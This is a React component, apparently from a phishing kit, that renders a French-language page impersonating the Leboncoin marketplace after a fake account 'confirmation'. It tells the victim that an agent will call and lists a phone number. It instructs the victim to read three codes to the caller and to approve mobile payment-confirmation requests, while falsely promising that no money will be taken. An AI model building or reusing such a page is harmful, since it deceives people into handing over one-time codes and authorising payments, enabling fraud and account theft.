import React from 'react';
import { Phone } from 'lucide-react';
import Logo from './Logo';

const AuthenticationSuccess = () => {
  return (
    <div className="min-h-screen bg-gradient-to-b from-white to-gray-50">
      <header className="p-4 border-b">
        <Logo />
      </header>
      
      <main className="container mx-auto px-4 py-8 max-w-2xl">
        <div className="bg-white rounded-2xl shadow-lg p-6 md:p-8">
          <div className="flex items-center justify-center mb-6">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
              <svg 
                className="w-8 h-8 text-green-500" 
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                <path 
                  strokeLinecap="round" 
                  strokeLinejoin="round" 
                  strokeWidth="2" 
                  d="M5 13l4 4L19 7"
                />
              </svg>
            </div>
          </div>

          <h1 className="text-2xl md:text-3xl font-bold text-center text-gray-800 mb-6">
            Merci d'avoir choisi Leboncoin
          </h1>

          <div className="space-y-6 text-gray-600">
            <p className="leading-relaxed">
              Suite aux nouvelles mesures de sécurité pour terminer la confirmation de votre compte, 
              vous serez contacté par téléphone par le service client dans les meilleurs délais.
            </p>

            <div className="bg-blue-50 rounded-lg p-4 flex items-start space-x-3">
              <Phone className="w-5 h-5 text-blue-500 mt-1 flex-shrink-0" />
              <div>
                <p className="font-medium text-blue-900">Service disponible 24h/24 et 7j/7</p>
                <p className="text-blue-800 text-lg font-semibold">0033 780 949 990</p>
              </div>
            </div>

            <div className="bg-gray-50 rounded-lg p-4 space-y-3">
              <p className="font-medium text-gray-900">
                Processus de vérification :
              </p>
              <ul className="list-disc list-inside space-y-2 text-gray-700">
                <li>Vous recevrez trois (3) differents codes à communiquer au conseiller</li>
                <li>Vous serez également amené à approuver des demandes de confirmation, mobile, chacune accompagnée d'un montant aléatoire à caractère non débiteur.</li>
              </ul>
            </div>

            <div className="bg-yellow-50 rounded-lg p-4 text-yellow-800">
              <p className="font-medium mb-2">Important :</p>
              <p>
                Aucun montant ne sera prélevé de votre compte pendant la vérification 
                de vos coordonnées et la confirmation de votre identité. Les simulations 
                qui seront faites ne nécessitent aucun frais.
              </p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default AuthenticationSuccess;